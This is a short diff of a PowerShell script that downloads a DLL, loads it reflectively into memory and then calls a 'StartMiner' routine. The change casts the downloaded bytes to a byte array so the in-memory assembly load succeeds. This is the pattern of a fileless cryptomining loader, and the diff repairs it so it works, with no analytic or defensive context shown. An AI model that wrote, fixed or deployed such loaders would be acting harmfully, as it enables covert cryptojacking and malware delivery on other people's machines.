@@ -178,7 +178,7 @@ for ($i = 1; $i -le $maxRetries; $i++) {
         }
         if ($bytes -and $bytes.Length -gt 0) {
             Write-Host "[+] DLL Downloaded ($($bytes.Length) bytes)"
-            $asm = [Reflection.Assembly]::Load($bytes)
+            $asm = [Reflection.Assembly]::Load([byte[]]$bytes)
             Write-Host "[+] Assembly Loaded: $($asm.FullName)"
             $repo = "$($c.u1)/$($c.u2)"
             Write-Host "[*] Invoking StartMiner..."
